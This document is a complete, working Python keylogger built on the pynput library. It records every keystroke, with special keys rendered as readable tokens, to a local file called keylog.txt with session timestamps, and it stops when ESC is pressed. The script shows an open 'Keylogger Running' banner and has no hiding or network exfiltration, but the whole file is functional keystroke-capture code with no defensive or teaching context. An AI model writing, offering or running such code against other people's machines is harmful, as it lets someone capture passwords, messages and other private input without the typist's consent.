from pynput import keyboard
from datetime import datetime

log_file = 'keylog.txt'

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def on_press(key):
    output = ""
    try:
        output = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            output = " "
        elif key == keyboard.Key.enter:
            output = "\n"
        elif key == keyboard.Key.tab:
            output = "\t"
        elif key == keyboard.Key.backspace:
            output = " [DEL] "
        elif key == keyboard.Key.caps_lock:
            output = ""
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
             output = ""
        else:
            output = f" [{str(key).replace('Key.', '')}] "

    if output:
        with open(log_file, "a") as f:
            f.write(output)

def on_release(key):
    if key == keyboard.Key.esc:
        with open(log_file, "a") as f:
            f.write(f"\n\n[Session Ended: {get_timestamp()}]\n")
            f.write("="*30 + "\n")
        return False

if __name__ == "__main__":
    print("\033c", end="")
    print(f"--- Keylogger Running ---\nSaving to: {log_file}\nPress ESC to stop.")

    with open(log_file, "a") as f:
        f.write(f"\n\n{'='*30}\n")
        f.write(f" NEW SESSION STARTED: {get_timestamp()}\n")
        f.write(f"{'='*30}\n\n")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()